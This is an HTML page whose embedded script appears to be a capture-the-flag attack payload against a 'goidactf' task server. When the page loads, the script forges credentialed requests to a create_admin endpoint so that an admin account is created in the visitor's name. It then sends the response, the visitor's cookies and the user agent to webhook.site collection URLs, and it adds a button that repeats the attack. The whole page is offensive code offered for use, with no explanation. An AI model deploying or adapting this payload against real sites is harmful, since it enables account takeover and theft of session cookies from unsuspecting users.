<html>
<body>
<script>
(async function() {
    try {
        // Создаем и отправляем форму для создания админа
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://tasks.goidactf.ru:20061/create_admin';
        form.enctype = 'application/x-www-form-urlencoded';
        form.innerHTML = '<input name="new_admin_login" value="123">';
        document.body.appendChild(form);

        // Отправляем форму с куками пользователя
        const response = await fetch('https://tasks.goidactf.ru:20061/create_admin', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json'
            },
            body: {'new_admin_login':123}
        });
        
        const result = await response.text();
        
        // Отправляем успешный результат на webhook
        await fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                timestamp: new Date().toISOString(),
                status: 'success',
                target: 'https://tasks.goidactf.ru:20061/create_admin',
                payload: 'new_admin_login=123',
                response_status: response.status,
                result: result,
                cookies: document.cookie
            })
        });
        
        // Создаем кнопку для повторения
        const btn = document.createElement('button');
        btn.textContent = 'Повторить запрос';
        btn.onclick = async () => {
            try {
                const repeatResponse = await fetch('https://tasks.goidactf.ru:20061/create_admin', {
                    method: 'POST',
                    credentials: 'include',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'new_admin_login=123'
                });
                
                const repeatResult = await repeatResponse.text();
                
                await fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        timestamp: new Date().toISOString(),
                        status: 'button_success',
                        action: 'button_click',
                        response_status: repeatResponse.status,
                        result: repeatResult
                    })
                });
            } catch (error) {
                // Отправляем ошибку с кнопки на webhook
                await fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        timestamp: new Date().toISOString(),
                        status: 'button_error',
                        action: 'button_click',
                        error: error.toString(),
                        error_message: error.message,
                        error_stack: error.stack
                    })
                });
            }
        };
        document.body.appendChild(btn);
        
    } catch (error) {
        // Отправляем ошибку основного запроса на webhook
        try {
            await fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    status: 'main_error',
                    target: 'https://tasks.goidactf.ru:20061/create_admin',
                    error: error.toString(),
                    error_message: error.message,
                    error_stack: error.stack,
                    cookies: document.cookie,
                    user_agent: navigator.userAgent
                })
            });
        } catch (webhookError) {
            // Если даже webhook не доступен
            console.error('Не удалось отправить ошибку на webhook:', webhookError);
        }
    }
})();
    alert(1334)
</script>
</body>
</html>
